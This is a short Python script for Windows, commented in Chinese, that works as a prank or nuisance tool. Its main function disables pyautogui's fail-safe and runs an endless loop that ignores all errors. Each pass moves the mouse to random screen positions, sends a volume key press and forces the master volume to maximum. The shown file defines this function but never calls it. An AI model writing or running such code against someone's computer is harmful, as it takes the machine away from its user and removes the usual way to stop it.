from win32api import keybd_event as keybdEvent # 导入win32api模块 用于模拟鼠标和键盘操作
from win32con import KEYEVENTF_KEYUP as KEYUP # 导入win32con模块 用于模拟鼠标和键盘操作
import pyautogui # 导入pyautogui模块 用于操控鼠标
from comtypes import CLSCTX_ALL # 导入comtypes模块 用于获取系统默认音频设备
from random import randint # 导入random模块 用于随机数生成
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume # 导入pycaw模块 用于获取系统默认音频设备


# 获取屏幕高度和宽度
def getScreenSize():
    winHeight = pyautogui.size()[1] - 1 # 减去1是为了避免鼠标位置超出屏幕
    winWidth = pyautogui.size()[0] - 1 # 减去1是为了避免鼠标位置超出屏幕
    return winHeight, winWidth # 返回屏幕高度和宽度
    

# 获取音频设备
def getAudioDevice():
    devices = AudioUtilities.GetSpeakers() # 获取系统默认音频设备
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None) # 获取音频设备接口
    volume = interface.QueryInterface(IAudioEndpointVolume) # 获取音频设备接口
    return volume # 返回音频设备


# 操控鼠标和键盘
def controlMouseKeys(winHeight = getScreenSize()[0], winWidth = getScreenSize()[1], volume = getAudioDevice()):
    pyautogui.FAILSAFE = False # 关闭鼠标失效保护
    while True: # 循环
        try: # 捕获异常
            pyautogui.moveTo(randint(1, winWidth), randint(1, winHeight)) # 鼠标相对随机位置移动
            keybdEvent(0xAF, 0, 0, 0)  # 按下音量减键
            keybdEvent(0xAF, 0, KEYUP, 0)  # 松开音量减键
            volume.SetMasterVolumeLevel(0, None) # 音量最大化
        except: pass # 忽略错误

